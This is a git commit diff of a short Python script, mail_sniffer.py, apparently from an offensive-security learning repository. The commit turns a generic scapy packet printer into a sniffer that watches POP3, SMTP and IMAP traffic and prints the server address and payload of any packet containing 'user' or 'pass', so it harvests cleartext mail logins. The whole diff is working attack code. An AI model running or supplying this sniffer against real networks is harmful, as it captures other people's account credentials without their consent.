6239b6cd72947ed76400d7878c6d4acc92ae7f58
edoardottt <edoardott@gmail.com>
2020-08-24 21:51:23 +0200

    update

--- mail_sniffer.py
+++ mail_sniffer.py
@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-Created on Mon Aug 24 19:25:19 2020
+Created on Mon Aug 24 20:12:10 2020
 
 @author: edoardottt
 """
@@ -10,7 +10,15 @@ from scapy.all import *
 
 # our packet callback
 def packet_callback(packet):
-    print(packet.show())
+    
+    if packet[TCP].payload:
+        
+        mail_packet = str(packet[TCP].payload)
+        
+        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
+            
+            print("[*] Server: {}".format(packet[IP].dst))
+            print("[*] {}".format(packet[TCP].payload))
     
 # fire up our sniffer
-sniff(filter="",prn=packet_callback,count=1)
+sniff(filter="tcp port 110 or tcp port 25 or tcp port 143",prn=packet_callback,store=0)
